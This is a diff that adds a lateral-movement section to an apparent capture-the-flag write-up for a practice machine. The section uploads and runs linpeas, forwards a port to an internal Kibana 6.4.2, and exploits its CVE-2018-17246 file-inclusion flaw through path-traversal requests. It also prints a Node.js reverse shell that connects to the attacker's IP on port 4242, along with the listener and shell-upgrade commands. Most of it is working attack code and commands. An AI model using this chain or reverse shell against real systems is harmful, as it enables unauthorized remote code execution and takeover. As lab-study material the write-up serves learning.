@@ -167,3 +167,100 @@ ssh -o StrictHostKeyChecking=no security@10.10.10.115
 # flag
 cat /home/security/user.txt
 ```
+
+### Lateral Movement
+
+Upload privesc scripts
+```bash
+mkdir -p /share/www
+
+curl -sS -L -o /share/www/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+# run static server
+python3 -m http.server -d /share/www
+
+# tun0 <IP_ADDRESS> of attacker
+curl -o /dev/shm/linpeas.sh 10.10.14.14:8000/linpeas.sh
+bash /dev/shm/linpeas.sh -a > /dev/shm/linpeas.txt
+
+less -r /dev/shm/linpeas.txt
+
+# it's running as ROOT
+/usr/share/logstash
+```
+
+Kibana vulnerability
+
+* [Local File Inclusion](https://github.com/mpgn/CVE-2018-17246)
+
+```bash
+# listening ipv4 ports
+ss -4 -l -n
+
+# port forward to attacker machine
+ssh -N -L 5602:127.0.0.1:5601 security@10.10.10.115
+
+# kibana version "6.4.2"
+curl -sS http://127.0.0.1:5602/api/status | jq '.version.number'
+```
+
+Sample payload
+```bash
+echo 'console.log("Hello World");' > /tmp/hello.js
+echo '(function(){console.log("Hello World");})();' > /tmp/hello.js
+echo '(function(){require("fs").writeFile("/tmp/hello.txt", "Hello World");return /a/;})();' > /tmp/hello.js
+# manual test
+/usr/share/kibana/node/bin/node /tmp/hello.js
+
+# kibana's log
+tail -f /var/log/kibana/kibana.stdout
+
+# from inside
+curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../tmp/hello.js'
+
+# from outside
+http "http://127.0.0.1:5602/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../tmp/hello.js"
+```
+
+Reverse shell
+```bash
+# vim /tmp/shell.js
+(function(){
+  var net = require("net"),
+    cp = require("child_process"),
+    sh = cp.spawn("/bin/sh", []);
+  var client = new net.Socket();
+  client.connect(4242, "10.10.14.14", function(){
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+  });
+  return /a/; // Prevents the Node.js application from crashing
+})();
+
+# listen
+nc -lvnp 4242
+
+# run payload
+curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js'
+```
+
+Upgrade shell
+```bash
+# in reverse-shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# background
+CTRL+Z
+
+# in attacker machine
+stty raw -echo
+
+# not typed
+fg
+ENTER
+ENTER
+
+# in reverse-shell
+export TERM=xterm
+```
